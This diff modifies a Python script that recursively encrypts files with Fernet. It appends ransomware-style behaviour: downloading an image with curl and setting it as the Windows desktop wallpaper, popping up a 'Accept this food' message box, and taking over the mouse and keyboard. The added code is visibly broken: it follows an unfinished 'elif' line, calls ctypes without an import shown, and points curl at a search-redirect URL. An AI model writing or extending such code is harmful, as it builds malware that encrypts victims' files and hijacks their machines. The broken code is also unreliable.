@@ -2,6 +2,7 @@
 
 from cryptography.fernet import Fernet
 import os
+import pyautogui
 
 # Function to encrypt a file or directory recursively
 def encrypt_path(path):
@@ -106,3 +107,34 @@ if mode == "1":
     encrypt_file(file_path)
 
 elif mode == "
+
+# set desktop wallpaper
+SPI_SETDESKWALLPAPER = 20
+
+# Set the path of the wallpaper image
+wallpaper_path = "https://www.google.com/url?sa=i&url=https%3A%2F%2Fwww.modernhoney.com%2Fchinese-orange-chicken%2F&psig=AOvVaw2tqgXeQq3Te1vPSfqZbdEU&ust=1682646307182000&source=images&cd=vfe&ved=0CBAQjRxqFwoTCODio434yP4CFQAAAAAdAAAAABAE"
+
+# Download the wallpaper image and save it to a local file
+os.system(f"curl {wallpaper_path} -o wallpaper.jpg")
+
+# Set the wallpaper image as the desktop background
+ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, os.path.abspath("wallpaper.jpg"), 3)
+
+
+# Define the message box parameters
+message = "Hi friend! Accept this food"
+title = "Popup Window"
+style = 0x40 | 0x1  # MB_ICONINFORMATION | MB_OK
+
+# Create the popup window
+ctypes.windll.user32.MessageBoxW(None, message, title, style)
+
+
+# Move the mouse to the center of the screen
+pyautogui.moveTo(pyautogui.size().width / 2, pyautogui.size().height / 2)
+
+# Click the left mouse button
+pyautogui.click()
+
+# Type a message
+pyautogui.typewrite("Hello, World!")
